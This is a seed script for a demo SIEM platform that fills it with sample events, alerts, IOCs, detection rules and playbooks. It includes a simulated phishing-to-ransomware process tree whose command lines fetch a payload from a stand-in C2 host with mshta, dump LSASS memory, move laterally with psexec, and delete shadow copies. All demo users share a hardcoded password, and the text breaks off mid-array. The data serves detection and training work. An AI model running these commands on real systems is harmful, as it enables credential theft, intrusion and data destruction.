'use strict';
require('dotenv').config();
const { v4: uuidv4 } = require('uuid');
const bcrypt = require('bcryptjs');
const { db, initDb, getDialect } = require('../models/db');
const { chInsert, chExec, initClickHouse } = require('../models/clickhouse');

const rand = (a, b) => Math.floor(Math.random() * (b - a + 1)) + a;
const pick = arr => arr[Math.floor(Math.random() * arr.length)];
const ago = ms => new Date(Date.now() - ms).toISOString();

const SOURCES   = ['Windows Security','Linux Syslog','Palo Alto Firewall','CrowdStrike EDR','Cisco DNS','Azure AD','AWS CloudTrail','Network IDS'];
const COMPUTERS = ['WS-001','WS-002','WS-023','SRV-001','SRV-002','DC-001','DC-002','GW-EDGE'];
const USERS     = ['arun.sharma','sita.rai','ram.poudel','gita.thapa','admin','svcAccount','SYSTEM','jmaharjan','bpaudel','pbasnet'];
const ACTIONS   = ['User Logon','Failed Logon','Process Create','Service Install','File Access','Network Connect','Privilege Use','PowerShell Exec','Registry Modify'];
const SEVS      = ['Info','Info','Info','Low','Low','Medium','High','Critical'];
const EIDS      = ['4624','4625','4688','7045','4672','5156','4634','4776','1102'];
const INDICES   = ['windows-security','linux-syslog','network-flow','endpoint-edr','cloud-identity'];
const TACTICS   = ['Initial Access','Execution','Persistence','Privilege Escalation','Defense Evasion','Credential Access','Discovery','Lateral Movement','Exfiltration','Command & Control'];
const TECHNIQUES= ['T1078','T1059.001','T1053.005','T1003.001','T1055','T1021.001','T1083','T1041','T1071.004','T1110.003'];
const ATITLES   = ['Brute Force Attack Detected','Lateral Movement via RDP','Suspicious PowerShell Execution',
  'Credential Dumping - LSASS Access','C2 Beacon Traffic Identified','Data Exfiltration via DNS Tunneling',
  'Privilege Escalation Alert','Malware Execution Blocked','Ransomware IOC Match','Mimikatz Usage Detected',
  'Cobalt Strike Beacon','Port Scan Activity','Account Lockout Spike','Pass-the-Hash Attack'];

async function seed() {
  await initDb();
  await initClickHouse();
  const d = db();

  await d.exec(`DELETE FROM playbook_executions; DELETE FROM ueba_scores; DELETE FROM kql_saved_queries;
          DELETE FROM intel_feeds; DELETE FROM incident_alerts; DELETE FROM incident_notes; DELETE FROM incidents; DELETE FROM iocs; DELETE FROM alerts;
          DELETE FROM playbooks; DELETE FROM correlation_rules; DELETE FROM users; DELETE FROM teams;
          DELETE FROM assets; DELETE FROM agents;`);
  await chExec('TRUNCATE TABLE events');
  await chExec('TRUNCATE TABLE process_nodes');
  await chExec('TRUNCATE TABLE audit_log');
  console.log('[Seed] Cleared');

  // Teams — team-scoped RBAC (see services/teamScope.js): analysts only see their team's
  // items plus unassigned ones, so seed a couple of teams with real members/agents to make
  // that actually demonstrable rather than everything landing in the shared inbox.
  const insTeam = d.prepare('INSERT INTO teams(id, name, description) VALUES(?,?,?)');
  const teamBlue = uuidv4(), teamRed = uuidv4();
  await insTeam.run(teamBlue, 'Blue Team', 'Defensive monitoring and incident response');
  await insTeam.run(teamRed, 'Red Team', 'Offensive security and adversary emulation');
  console.log('[Seed] Teams: 2');

  // Users
  const pwHash = bcrypt.hashSync('K3@2026', 10);
  const insU = d.prepare(`INSERT INTO users(id,username,email,password_hash,role,full_name,department,team_id) VALUES(?,?,?,?,?,?,?,?)`);
  for (const r of [
    [uuidv4(),'pbasnet','pbasnet@k3siem.local',pwHash,'admin','Prem Basnet','Security Operations',null],
    [uuidv4(),'jmaharjan','jmaharjan@k3siem.local',pwHash,'t2_analyst','Jenan Maharjan','Security Operations',teamBlue],
    [uuidv4(),'bpaudel','bpaudel@k3siem.local',pwHash,'t2_analyst','Bamdev Paudel','Security Operations',teamRed],
    [uuidv4(),'analyst1','analyst1@k3siem.local',pwHash,'t1_analyst','SOC Analyst','Security Operations',teamBlue],
  ]) await insU.run(...r);
  console.log('[Seed] Users: 4');

  // Events - 500 rows
  const evtRows = Array.from({length:500}, () => {
    const sev=pick(SEVS), src=pick(SOURCES), comp=pick(COMPUTERS), user=pick(USERS);
    const ip=`${rand(10,192)}.${rand(1,254)}.${rand(1,254)}.${rand(1,254)}`;
    const action=pick(ACTIONS), eid=pick(EIDS), ts=ago(rand(0,86400000));
    const idx=pick(INDICES);
    return { id:uuidv4(), timestamp:ts, source:src, event_id:eid, computer:comp, username:user, ip_address:ip,
      action, severity:sev, raw_log:JSON.stringify({EventID:eid,Computer:comp,User:user,IP:ip}), index_name:idx, agent_id:null };
  });
  await chInsert('events', evtRows);
  console.log('[Seed] Events: 500');

  // Alerts - 60 rows
  const insA = d.prepare(`INSERT INTO alerts(id,title,description,severity,status,source,asset,username,ip_address,mitre_tactic,mitre_technique,risk_score,created_at,updated_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?)`);
  const insertAlerts = d.transaction(async (rows) => { for (const r of rows) await insA.run(...r); });
  await insertAlerts(Array.from({length:60}, () => {
    const sev=pick(['Critical','High','High','Medium','Medium','Low']);
    const title=pick(ATITLES), ts=ago(rand(0,604800000));
    const ip=`${rand(10,192)}.${rand(1,254)}.${rand(1,254)}.${rand(1,254)}`;
    return [uuidv4(),title,`Automated detection: ${title} on ${pick(COMPUTERS)}`,
      sev,pick(['New','Assigned','In Progress','Closed']),pick(SOURCES),pick(COMPUTERS),
      pick(USERS),ip,pick(TACTICS),pick(TECHNIQUES),rand(20,99),ts,ts];
  }));
  console.log('[Seed] Alerts: 60');

  // Incidents - 6 rows (linked to existing alerts)
  const insInc = d.prepare(`INSERT INTO incidents(id,title,description,severity,status,priority,owner,tags,created_at,updated_at) VALUES(?,?,?,?,?,?,?,?,?,?)`);
  const insLink = d.prepare(getDialect() === 'postgres'
    ? 'INSERT INTO incident_alerts(incident_id,alert_id) VALUES(?,?) ON CONFLICT DO NOTHING'
    : 'INSERT OR IGNORE INTO incident_alerts(incident_id,alert_id) VALUES(?,?)'
  );
  const insNote = d.prepare('INSERT INTO incident_notes(id,incident_id,author,note,created_at) VALUES(?,?,?,?,?)');
  const sampleAlerts = await d.prepare('SELECT id,title,severity,created_at FROM alerts ORDER BY created_at DESC LIMIT 12').all();
  const owners = ['pbasnet', 'jmaharjan', 'bpaudel', 'analyst1'];
  const statuses = ['Open', 'In Progress', 'Contained', 'Eradicated', 'Recovered', 'Closed'];
  const incidentIds = [];
  for (let i = 0; i < 6; i++) {
    const a = sampleAlerts[i];
    const incId = uuidv4();
    const status = statuses[i % statuses.length];
    const createdAt = ago(rand(0, 604800000));
    await insInc.run(
      incId,
      `IR-${String(i + 1).padStart(3, '0')}: ${a?.title || pick(ATITLES)}`,
      `Incident case created for triage and response. Linked alert severity: ${a?.severity || 'Medium'}.`,
      a?.severity || pick(['Critical', 'High', 'Medium', 'Low']),
      status,
      rand(1, 4),
      pick(owners),
      JSON.stringify(['incident-response', 'demo']),
      createdAt,
      createdAt
    );
    incidentIds.push(incId);
    if (a?.id) await insLink.run(incId, a.id);
    await insNote.run(uuidv4(), incId, pick(owners), 'Initial triage started. Evidence collection in progress.', createdAt);
    await insNote.run(uuidv4(), incId, pick(owners), 'Next steps: confirm scope, contain impacted host/user, preserve logs.', ago(rand(0, 604800000)));
  }
  console.log('[Seed] Incidents: 6');

  // IR-007: Dedicated process-tree demo incident — full phishing-to-ransomware attack chain
  const insIncFull = d.prepare(`INSERT INTO incidents(id,title,description,severity,status,priority,owner,tags,impact,remediation,lessons_learned,created_at,updated_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?)`);

  const chainIncId = uuidv4();
  const chainStart = ago(3 * 86400000); // 3 days ago
  const chainHost = 'WS-PC-001', chainUser = 'john.doe';
  const atTime = (offsetMin) => new Date(new Date(chainStart).getTime() + offsetMin * 60000).toISOString();

  const CHAIN = [
    { parent: null, pid: 4210, ppid: 1120, name: 'OUTLOOK.EXE', image: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE', cmd: 'OUTLOOK.EXE /recycle', evt: 'Process Create', tactic: 'Initial Access', tech: 'T1566.001', sev: 'Low', mal: 0, offset: 0,
      detectedBy: 'K3 Email Gateway — Attachment Scan', rule: 'Phishing Attachment Heuristic',
      analysis: 'User john.doe opened Outlook and received an email with a macro-enabled Word attachment (invoice_0847.docm) from a spoofed external vendor domain.',
      impact: 'Initial foothold established via user-executed phishing lure; no code execution yet.',
      remediation: 'Quarantine the source email organization-wide and block the sender domain at the email gateway.' },
    { parent: 0, pid: 4588, ppid: 4210, name: 'WINWORD.EXE', image: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE', cmd: 'WINWORD.EXE /n "C:\\Users\\john.doe\\Downloads\\invoice_0847.docm"', evt: 'Process Create', tactic: 'Initial Access', tech: 'T1566.001', sev: 'Low', mal: 0, offset: 1,
      detectedBy: 'K3 EDR — Office Macro Monitor', rule: 'Macro-Enabled Document Opened',
      analysis: 'invoice_0847.docm opened; the document contains an auto-executing VBA macro flagged as obfuscated on open.',
      impact: 'Malicious macro now has execution context inside a trusted Office process.',
      remediation: "Enable 'Block macros from the internet' via GPO and enforce Protected View for downloaded documents." },
    { parent: 1, pid: 5102, ppid: 4588, name: 'powershell.exe', image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', cmd: 'powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAA==', evt: 'Process Create', tactic: 'Execution', tech: 'T1059.001 / T1027', sev: 'High', mal: 1, offset: 2,
      hash: 'a4d1c9f6e2b8730fca19d5e0b7f2c341a9c8d5e6f1a2b3c4d5e6f7a8b9c0d1e2',
      detectedBy: 'K3 EDR — Behavioral Detection Engine', rule: 'Suspicious Child Process of Office Application',
      analysis: 'WINWORD.EXE spawned powershell.exe with a Base64-encoded (-enc) command line — a strong indicator of a malicious macro payload dropper (T1059.001 + T1027 obfuscation).',
      impact: 'Attacker now has arbitrary code execution on WS-PC-001 as john.doe.',
      remediation: 'Kill the process tree, isolate the host from the network via EDR, and block the hash of the decoded payload.' },
    { parent: 2, pid: 5344, ppid: 5102, name: 'cmd.exe', image: 'C:\\Windows\\System32\\cmd.exe', cmd: 'cmd.exe /c whoami /all & systeminfo & net config workstation', evt: 'Process Create', tactic: 'Discovery', tech: 'T1082 / T1033', sev: 'Medium', mal: 1, offset: 4,
      detectedBy: 'K3 Correlation Rule: Malware Execution Chain', rule: 'Malware Execution Chain',
      analysis: 'PowerShell spawned cmd.exe to run whoami /all and systeminfo — automated situational-awareness recon typical of post-exploitation frameworks.',
      impact: 'Attacker enumerated local privileges and domain context to plan the next stage.',
      remediation: 'Review 4688 command-line logging for the full recon scope and rotate any credentials enumerated.' },
    { parent: 2, pid: 5601, ppid: 5102, name: 'mshta.exe', image: 'C:\\Windows\\System32\\mshta.exe', cmd: 'mshta.exe http://evil-c2.top/stage2.hta', evt: 'Network Connect', tactic: 'Command and Control', tech: 'T1218.005', sev: 'High', mal: 1, offset: 7,
      detectedBy: 'IOC Match — C2 Domain (Threat Intel Feed)', rule: 'evil-c2.top DNS/HTTP Match',
      analysis: 'mshta.exe reached out to evil-c2.top (matches an active LockBit C2 indicator in the threat intel feed) and downloaded a second-stage HTA payload.',
      impact: 'Stage-2 payload retrieved; an outbound C2 channel is now established.',
      remediation: 'Block evil-c2.top at the DNS/proxy layer organization-wide and capture PCAP for the investigation.' },
    { parent: 4, pid: 5890, ppid: 5601, name: 'svchost.exe', image: 'C:\\Users\\john.doe\\AppData\\Local\\Temp\\svchost.exe', cmd: 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "WindowsUpdate" /d "C:\\Users\\john.doe\\AppData\\Local\\Temp\\svchost.exe" /f && schtasks /create /tn "SysUpdate" /tr "svchost.exe" /sc onlogon', evt: 'Registry Modify', tactic: 'Persistence', tech: 'T1547.001 / T1053.005', sev: 'Critical', mal: 1, offset: 10,
      hash: 'b7e2f1a9c3d84650fea27bd1c9e4f832bc16d9e0f2a3b4c5d6e7f8a9b0c1d2e3',
      detectedBy: 'K3 EDR — Behavioral Detection Engine', rule: 'Process Masquerading + Registry Run Key Persistence',
      analysis: 'Payload dropped to the Temp folder as svchost.exe (masquerading — the legitimate svchost.exe never runs from AppData) and created a Run key plus a scheduled task for persistence across reboots.',
      impact: 'Attacker persistence achieved; the malware survives reboot and logoff.',
      remediation: 'Remove the Run key and scheduled task, delete the dropped binary, and submit the hash to MISP.' },
    { parent: 5, pid: 6120, ppid: 5890, name: 'net.exe', image: 'C:\\Windows\\System32\\net.exe', cmd: 'net view /domain & net share & net group "Domain Admins" /domain', evt: 'Process Create', tactic: 'Discovery', tech: 'T1018 / T1135', sev: 'Medium', mal: 1, offset: 15,
      detectedBy: 'K3 Correlation Rule: Malware Execution Chain', rule: 'Malware Execution Chain',
      analysis: 'net.exe used to enumerate domain computers and shares — the attacker mapped the network for lateral-movement targets and identified DC-001 as the domain controller.',
      impact: 'Internal network topology and lateral-movement targets exposed to the attacker.',
      remediation: 'Restrict SMB/domain enumeration for standard users and alert on net.exe usage from non-admin context.' },
    { parent: 5, pid: 6455, ppid: 5890, name: 'procdump.exe', image: 'C:\\Users\\john.doe\\AppData\\Local\\Temp\\procdump.exe', cmd: 'procdump.exe -accepteula -ma lsass.exe lsass_dump.bin', evt: 'File Access', tactic: 'Credential Access', tech: 'T1003.001', sev: 'Critical', mal: 1, offset: 20,
      hash: 'd41d8cd98f00b204e9800998ecf8427e',
      detectedBy: 'K3 EDR — Behavioral Detection Engine', rule: 'LSASS Memory Access',
      analysis: 'procdump.exe (renamed to evade detection) accessed lsass.exe memory to dump credentials — a classic Mimikatz-style credential theft technique; the dump tool hash matches a known Mimikatz variant IOC.',
      impact: 'Cached domain credentials, including a domain admin service account, are now exposed to the attacker.',
      remediation: 'Force a password reset for every account cached on this host, enable Credential Guard, and block LSASS access via ASR rules.' },
    { parent: 7, pid: 6800, ppid: 5890, name: 'psexec.exe', image: 'C:\\Users\\john.doe\\AppData\\Local\\Temp\\psexec.exe', cmd: 'psexec.exe \\\\DC-001 -u CORP\\svc-backup -p ****** cmd.exe', evt: 'Network Connect', tactic: 'Lateral Movement', tech: 'T1021.002', sev: 'Critical', mal: 1, offset: 28,
      detectedBy: 'T2 Analyst Manual Triage', rule: 'Manual Escalation — SMB Admin Share Authentication',
      analysis: 'Using the credentials dumped from LSASS, the attacker used psexec.exe to authenticate to DC-001 via SMB admin shares and execute code remotely — pivoting from a single workstation to the domain controller.',
      impact: 'Compromise has spread from WS-PC-001 to the domain controller (DC-001); full domain compromise is imminent.',
      remediation: 'Immediately isolate DC-001, disable the compromised admin account, and force a domain-wide credential reset (golden-ticket risk).' },
    { parent: 8, pid: 7011, ppid: 6800, name: 'vssadmin.exe', image: 'C:\\Windows\\System32\\vssadmin.exe', cmd: 'vssadmin.exe delete shadows /all /quiet && ransom.exe --encrypt --path=\\\\DC-001\\shares', evt: 'Process Create', tactic: 'Impact', tech: 'T1490 / T1486', sev: 'Critical', mal: 1, offset: 35,
      hash: '4d5a900098765432100fedcba987654',
      detectedBy: 'K3 EDR — Behavioral Detection Engine (Ransomware Canary)', rule: 'Shadow Copy Deletion + Mass File Encryption',
      analysis: 'vssadmin.exe delete shadows /all /quiet executed on DC-001, immediately followed by mass file-encryption activity matching LockBit ransomware behavior — the final impact stage of the attack.',
      impact: 'Full domain compromise: shadow copies destroyed and file shares across the domain encrypted; business operations halted.',
      remediation: 'Activate the IR/DR plan, restore from offline backups, engage legal/law enforcement, and rebuild DC-001 from clean media.' },
  ];

  const chainNodeIds = CHAIN.map(() => uuidv4());
  await chInsert('process_nodes', CHAIN.map((n, i) => ({
    id: chainNodeIds[i], incident_id: chainIncId, parent_id: n.parent === null ? null : chainNodeIds[n.parent], sequence: i + 1,
    pid: n.pid, ppid: n.ppid, process_name: n.name, image: n.image, command_line: n.cmd, hostname: chainHost,
    username: chainUser, sha256: n.hash || null, event_type: n.evt, mitre_tactic: n.tactic, mitre_technique: n.tech,
    severity: n.sev, is_malicious: n.mal, first_detected_by: n.detectedBy, detection_rule: n.rule, auto_analysis: n.analysis,
    impact: n.impact, remediation: n.remediation,
    lessons_learned: i === CHAIN.length - 1 ? 'Post-incident review found no single control would have stopped this chain; layered fixes (macro policy, LSASS hardening, segmentation, mail sandboxing) were required.' : null,
    timestamp: atTime(n.offset),
  })));

  await insIncFull.run(
    chainIncId,
    'IR-007: Multi-Stage Ransomware Attack — Phishing to Full Domain Compromise',
    'Phishing email with a macro-enabled attachment led to PowerShell execution, credential theft via LSASS dumping, lateral movement to the domain controller, and LockBit-style ransomware deployment on WS-PC-001 and DC-001.',
    'Critical', 'Contained', 1, 'jmaharjan', JSON.stringify(['ransomware', 'phishing', 'lateral-movement', 'process-tree-demo']),
    'Full compromise of WS-PC-001 and the primary domain controller (DC-001); domain admin credentials stolen; ransomware deployed with shadow-copy deletion, encrypting file shares across the domain. Estimated business disruption: multi-day outage across Security Operations, IT, and Engineering.',
    'Isolated WS-PC-001 and DC-001 from the network; rebuilt DC-001 from clean media; force-reset all domain credentials (especially the compromised admin account); restored file shares from offline backups; blocked all identified C2 domains/IPs/hashes organization-wide; deployed ASR rules blocking LSASS access and Office-spawned script interpreters.',
    "Macro execution from internet-sourced Office documents was not blocked by GPO — closed via 'Block macros from the internet' policy. LSASS access was not restricted — Credential Guard and ASR rules are now enforced fleet-wide. No network segmentation existed between workstations and the domain controller — VLAN segmentation and a tiered admin model are being rolled out. The email gateway did not flag the initial phishing attachment — attachment sandboxing has been added to the mail flow.",
    chainStart, ago(0)
  );

  for (const title of ['Suspicious PowerShell Execution', 'Credential Dumping - LSASS Access', 'Ransomware IOC Match']) {
    const linkedAlert = await d.prepare('SELECT id FROM alerts WHERE title = ? LIMIT 1').get(title);
    if (linkedAlert?.id) await insLink.run(chainIncId, linkedAlert.id);
  }
  await insNote.run(uuidv4(), chainIncId, 'jmaharjan', 'Full attack chain reconstructed from EDR process tree — phishing attachment through domain controller compromise. See linked process tree for stage-by-stage detection and remediation detail.', ago(2 * 86400000));
  await insNote.run(uuidv4(), chainIncId, 'pbasnet', 'Incident contained: both hosts isolated, DC-001 rebuilt, domain-wide credential reset completed. Moving to post-incident review for lessons learned.', ago(86400000));
  console.log('[Seed] Process tree demo incident (IR-007): 1 incident, 10 process nodes');

  // IOCs
  const insI = d.prepare(`INSERT INTO iocs(id,type,value,confidence,severity,source,description,tags,hits,first_seen) VALUES(?,?,?,?,?,?,?,?,?,?)`);
  for (const [type,value,conf,sev,src,desc,tags,hits] of [
    ['IP','185.220.101.47',95,'Critical','AbuseIPDB','Known Tor exit node - APT campaigns','["APT29","Tor"]',12],
    ['IP','91.108.4.200',88,'High','OTX AlienVault','C2 server - Cobalt Strike','["CobaltStrike","C2"]',7],
    ['Domain','evil-c2.top',92,'Critical','MISP','Active C2 - LockBit ransomware','["Ransomware","LockBit"]',5],
    ['Domain','malware-payload.xyz',85,'High','VirusTotal','Malware distribution domain','["Malware","Dropper"]',3],
    ['Hash','d41d8cd98f00b204e9800998ecf8427e',90,'Critical','VirusTotal','Mimikatz variant','["Mimikatz","CredDump"]',8],
    ['Hash','4d5a900098765432100fedcba987654',78,'High','Recorded Future','Ransomware payload','["Ransomware"]',2],
    ['URL','http://45.33.32.156/payload.exe',88,'Critical','MISP','Malware download URL','["Dropper"]',4],
    ['URL','https://cryptominer.pw/miner.js',75,'High','AbuseIPDB','Cryptomining script','["Cryptominer"]',9],
    ['Email','attacker@phish-campaign.com',82,'High','Internal','Phishing campaign sender','["Phishing","BEC"]',15],
    ['Domain','cobalt-strike-c2.ru',94,'Critical','Recorded Future','Active Cobalt Strike C2','["CobaltStrike","APT"]',6],
    ['IP','192.168.100.254',60,'Medium','Internal','Internal suspicious host','["Internal","Recon"]',22],
    ['Hash','abc123def456789012345678901234',70,'Medium','VirusTotal','Suspicious obfuscated script','["Script"]',1],
  ]) await insI.run(uuidv4(),type,value,conf,sev,src,desc,tags,hits,ago(rand(0,2592000000)));
  console.log('[Seed] IOCs: 12');

  // Correlation rules
  const insCR = d.prepare(`INSERT INTO correlation_rules(id,name,description,logic,severity,risk_score,window_minutes,indices,threshold,hit_count) VALUES(?,?,?,?,?,?,?,?,?,?)`);
  for (const [name,desc,logic,sev,score,win,idx,thr,hits] of [
    ['Brute Force → Privilege Escalation','Failed logins then privilege use same account','EventID==4625 count>=10 within window → EventID==4672 same account','Critical',95,5,'["windows-security"]',10,7],
    ['Lateral Movement via RDP','RDP success from new internal host','EventID==4624 LogonType==10 new_source → DestPort==3389','High',88,15,'["windows-security","network-flow"]',3,3],
    ['Data Staging and DNS Exfil','Large file write then anomalous DNS','FileWrite size>10MB temp_dir → DNSQuery TXT count>100','Critical',92,30,'["endpoint-edr","network-flow"]',1,1],
    ['Malware Execution Chain','Script exec → injection → C2 beacon','CmdLine has bypass → ProcessInjection → OutboundC2','Critical',97,10,'["endpoint-edr","network-flow"]',1,2],
    ['Account Takeover Pattern','Password spray → MFA enroll → mass access','FailedLogin count>5 external → MFADeviceAdd → MailboxAccess count>50','High',91,60,'["cloud-identity","windows-security"]',5,4],
    ['Kerberoasting Detection','SPN ticket requests for many accounts','EventID==4769 EncryptionType==0x17 count>5 same_user','High',85,5,'["windows-security"]',5,2],
    ['Windows Audit Log Cleared','Security audit log cleared on a Windows host','EventID==1102','Critical',99,5,'["windows-security"]',1,0],
    ['Suspicious PowerShell Encoded Command','PowerShell command line contains encoded execution switches','CmdLine has encodedcommand','High',92,15,'["windows-powershell","windows-security"]',1,0],
    ['PowerShell Download Cradle','PowerShell command line includes download cradle behavior','CmdLine has downloadstring','Critical',94,15,'["windows-powershell","windows-security"]',1,0],
    ['New Service Installed on Windows','A new Windows service was created or installed','EventID==7045','High',87,10,'["windows-system","windows-security"]',1,0],
    ['Explicit Credential Logon Spike','Repeated explicit credential logons on a Windows host','EventID==4648','High',82,10,'["windows-security"]',3,0],
    ['Special Privileges Assigned','Special administrator-style privileges assigned to a non-system account','EventID==4672','High',84,10,'["windows-security"]',2,0],
  ]) await insCR.run(uuidv4(),name,desc,logic,sev,score,win,idx,thr,hits);
  console.log('[Seed] Correlation rules: 12');

  // Playbooks
  const insPB = d.prepare(`INSERT INTO playbooks(id,name,description,trigger_condition,status,steps,execution_count) VALUES(?,?,?,?,?,?,?)`);
  for (const [name,desc,trigger,status,steps,count] of [
    ['Brute Force Response','Automated containment for brute force','failed_login_count >= 10 within 5 minutes','Active',
     JSON.stringify(['Detect threshold breach via correlation rule','Block source IP on perimeter firewall (Palo Alto API)','Lock affected user account in Active Directory','Send alert to SOC Slack channel','Create Jira incident ticket with evidence','Generate SIEM incident timeline report','Notify account owner via email']),47],
    ['Malware Containment','Isolation and forensics for malware','EDR malware detection confidence > 85%','Active',
     JSON.stringify(['Isolate endpoint from network via CrowdStrike API','Kill identified malicious process tree','Collect memory dump and disk image','Quarantine malicious file — submit hash to MISP','Notify assigned analyst in Teams','Trigger full AV scan on adjacent systems','Submit IOCs to threat intel feed']),12],
    ['Phishing Email Response','End-to-end phishing remediation','Email gateway phishing alert OR user-reported','Active',
     JSON.stringify(['Extract IOCs from email headers and body','Search IOCs across all SIEM indices (last 30d)','Block sender domain on email gateway','Search all mailboxes for similar messages','Delete matching phishing emails organization-wide','Block IOC URLs on web proxy','Send user awareness notification']),89],
    ['Privilege Escalation Response','Containment of privilege escalation','risk_score > 80 and mitre_tactic == Privilege Escalation','Paused',
     JSON.stringify(['Correlate with parent process and user session','Review account privilege history (last 7d)','Disable compromised account temporarily','Alert SOC manager via Slack and email','Capture forensic process timeline','Reset credentials and revoke tokens','Escalate to IR team if confirmed']),8],
  ]) await insPB.run(uuidv4(),name,desc,trigger,status,steps,count);
  console.log('[Seed] Playbooks: 4');

  // UEBA
  const insUEBA = d.prepare(`INSERT INTO ueba_scores(id,username,risk_score,anomaly_count,baseline_deviation,flags,department,location,last_activity) VALUES(?,?,?,?,?,?,?,?,?)`);
  for (const [user,risk,anom,dev,flags,dept,loc] of [
    ['arun.sharma',78,4,2.3,'["Geo-Velocity","Off-Hours Login"]','Engineering','HQ'],
    ['sita.rai',45,1,0.8,'[]','HR','HQ'],
    ['ram.poudel',91,7,4.1,'["Mass Download","Peer Group Deviation","Off-Hours Login"]','IT','Remote - VPN'],
    ['gita.thapa',22,0,0.2,'[]','Operations','HQ'],
    ['bikash.kc',67,3,1.9,'["Off-Hours Login"]','Security','Branch'],
    ['sunita.malla',33,1,0.5,'[]','Legal','HQ'],
    ['admin',85,5,3.2,'["Privilege Abuse","Suspicious Process"]','IT','SRV-001'],
    ['jmaharjan',18,0,0.1,'[]','Security Operations','HQ'],
    ['bpaudel',29,1,0.4,'[]','Security Operations','HQ'],
    ['pbasnet',12,0,0.0,'[]','Security Operations','HQ'],
  ]) await insUEBA.run(uuidv4(),user,risk,anom,dev,flags,dept,loc,ago(rand(0,3600000)));
  console.log('[Seed] UEBA scores: 10');

  // KQL saved queries
  const insKQL = d.prepare(`INSERT INTO kql_saved_queries(id,name,query,description,category,is_rule) VALUES(?,?,?,?,?,?)`);
  for (const [name,query,desc,cat,isRule] of [
    ['Brute Force Detection','SecurityEvent\n| where event_id == "4625"\n| where timestamp > datetime_ago("5m")\n| order by timestamp desc','Count failed logins per user/IP','Authentication',1],
    ['Suspicious PowerShell','SecurityEvent\n| where event_id == "4688"\n| where action has_any ("PowerShell","bypass","encoded","hidden")\n| project timestamp, computer, username, action\n| order by timestamp desc','PowerShell abuse detection','Execution',1],
    ['Privilege Use Events','SecurityEvent\n| where event_id == "4672"\n| where username != "SYSTEM"\n| order by timestamp desc','Special privilege assignment events','PrivEsc',1],
    ['All Critical Events','SecurityEvent\n| where severity == "Critical"\n| order by timestamp desc','Critical severity events from all sources','Investigation',1],
    ['Failed Logins Last Hour','SecurityEvent\n| where event_id == "4625"\n| order by timestamp desc','All authentication failures','Authentication',0],
    ['Top 10 Recent Events','SecurityEvent\n| top 10','Quick view of latest events','Baseline',0],
  ]) await insKQL.run(uuidv4(),name,query,desc,cat,isRule);
  console.log('[Seed] KQL queries: 6');

  // Intel feeds
  const insFeed = d.prepare(`INSERT INTO intel_feeds(id,name,url,type,status,last_sync,ioc_count) VALUES(?,?,?,?,?,?,?)`);
  for (const [name,url,type,status,sync,count] of [
    ['MISP Instance','https://misp.example.com','STIX/TAXII','active',ago(120000),847],
    ['VirusTotal API','https://www.virustotal.com/api','REST','active',ago(300000),12043],
    ['AbuseIPDB','https://api.abuseipdb.com','REST','active',ago(60000),5821],
    ['OTX AlienVault','https://otx.alienvault.com/api','REST','active',ago(480000),3219],
    ['Recorded Future','https://api.recordedfuture.com','REST','active',ago(720000),9871],
    ['NVD NIST CVE','https://nvd.nist.gov/feeds','XML','active',ago(3600000),2341],
  ]) await insFeed.run(uuidv4(),name,url,type,status,sync,count);
  console.log('[Seed] Intel feeds: 6');

  // Agents + Assets
  const insAgent = d.prepare('INSERT INTO agents(id, hostname, os, ip, status, agent_version, tags, collected_sources, events_sent, last_heartbeat, team_id) VALUES(?,?,?,?,?,?,?,?,?,?,?)');
  const insAsset = d.prepare('INSERT INTO assets(id, agent_id, hostname, os_name, os_version, os_arch, cpu_model, cpu_cores, ram_total_gb, disk_total_gb, disk_used_gb, network_interfaces, installed_software, running_services, open_ports, local_users, antivirus_status, firewall_enabled, last_patch_date, uptime_hours, domain, serial_number) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)');

  const agentsData = [
    { hostname: 'WS-PC-001', os: 'Windows 11 Pro', ip: '192.168.1.66', version: '1.0.0', sources: ['Windows Security', 'CrowdStrike EDR'], events: 1247, team: teamBlue,
      asset: { os_name: 'Windows 11 Pro', os_version: '10.0.22631', os_arch: 'x86_64', cpu_model: 'Intel Core i7-13700K', cpu_cores: 16, ram: 16.0, disk: 512.0, disk_used: 287.3, av: 'CrowdStrike Falcon', fw: 1, patch: '2026-06-15', uptime: 168.5, domain: 'corp.k3sec.io', serial: 'K3-WS-001',
        net: [{"name":"Ethernet","ip":"192.168.1.66","mac":"00:1A:2B:3C:4D:5E"}],
        sw: [{"name":"CrowdStrike Falcon","version":"7.10"},{"name":"SentinelOne Agent","version":"24.2"},{"name":"K3 SIEM Agent","version":"1.0.0"},{"name":"Microsoft 365","version":"16.0"},{"name":"Chrome","version":"126.0"},{"name":"VS Code","version":"1.92"},{"name":"Python 3.12","version":"3.12.4"},{"name":"Slack","version":"4.39"},{"name":"Zoom","version":"6.1"},{"name":"7-Zip","version":"24.07"}],
        svc: [{"name":"CrowdStrike","status":"running"},{"name":"Windows Defender","status":"running"},{"name":"DNS Client","status":"running"}],
        ports: [{"port":135,"proto":"tcp"},{"port":445,"proto":"tcp"},{"port":3389,"proto":"tcp"}],
        users: [{"name":"john.doe"},{"name":"Administrator"}] }},
    { hostname: 'SRV-UBUNTU-01', os: 'Ubuntu 24.04 LTS', ip: '10.0.1.50', version: '1.0.0', sources: ['Linux Syslog', 'OSSEC HIDS'], events: 3892, team: teamRed,
      asset: { os_name: 'Ubuntu 24.04 LTS', os_version: '6.8.0-45-generic', os_arch: 'x86_64', cpu_model: 'AMD EPYC 7763', cpu_cores: 8, ram: 64.0, disk: 1000.0, disk_used: 423.7, av: 'ClamAV', fw: 1, patch: '2026-06-20', uptime: 744.2, domain: 'srv.k3sec.io', serial: 'K3-SRV-001',
        net: [{"name":"eth0","ip":"10.0.1.50","mac":"02:42:AC:11:00:02"}],
